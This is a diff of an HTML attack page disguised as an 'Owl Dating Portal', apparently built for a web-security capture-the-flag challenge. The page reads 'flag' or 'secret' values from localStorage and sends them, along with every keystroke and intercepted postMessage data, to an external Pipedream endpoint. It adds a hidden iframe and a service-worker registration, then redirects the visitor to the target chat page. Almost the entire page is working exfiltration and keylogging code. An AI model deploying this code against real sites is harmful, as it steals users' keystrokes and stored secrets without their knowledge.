@@ -1,21 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading Chat...</title>
-</head>
-<body>
+    <title>Owl Dating Portal</title>
     <script>
-        // Set the keylogger payload in window.name
-        window.name = `
-            // Keylogger payload
-            document.addEventListener('keydown', function(e) {
-                // Send each keystroke to your Pipedream endpoint
+        // Primary function to steal data from client-side storage
+        function stealData() {
+            // Attempt to access localStorage (common storage for flags)
+            const flag = localStorage.getItem('secret') || localStorage.getItem('flag');
+            
+            // If found, exfiltrate immediately
+            if (flag) {
+                fetch('https://eooaktfbjo7cto7.m.pipedream.net?flag=' + encodeURIComponent(flag));
+                return;
+            }
+
+            // Keylogger fallback
+            document.addEventListener('keydown', (e) => {
                 fetch('https://eooaktfbjo7cto7.m.pipedream.net?key=' + encodeURIComponent(e.key));
             });
-        `;
-        
-        // Redirect to the suspected Owley Madison chat page
-        window.location = 'https://gameserver.websec.saarland/owley/chat';
+        }
+
+        // SOP Bypass Technique 1: postMessage hijacking
+        window.addEventListener('message', (event) => {
+            // Verify origin for security (not strictly necessary for attack)
+            if (event.origin === 'https://gameserver.websec.saarland') {
+                // Exfiltrate received data
+                fetch('https://eooaktfbjo7cto7.m.pipedream.net?data=' + 
+                      encodeURIComponent(JSON.stringify(event.data)));
+            }
+        });
+
+        // SOP Bypass Technique 2: Iframe + location.hash
+        function startIframeAttack() {
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'https://gameserver.websec.saarland/owley/chat#stealData()';
+            document.body.appendChild(iframe);
+        }
+
+        // SOP Bypass Technique 3: Service Worker (if supported)
+        function registerServiceWorker() {
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.register('/sw.js')
+                    .then(() => {
+                        console.log('Service Worker registered');
+                    });
+            }
+        }
+
+        // Initialize attacks
+        setTimeout(() => {
+            stealData();
+            startIframeAttack();
+            registerServiceWorker();
+        }, 3000);
+    </script>
+</head>
+<body>
+    <h1>Loading Owl Dating Portal...</h1>
+    <script>
+        // Redirect to chat page after setting up attacks
+        setTimeout(() => {
+            window.location = 'https://gameserver.websec.saarland/owley/chat';
+        }, 1000);
     </script>
 </body>
 </html>
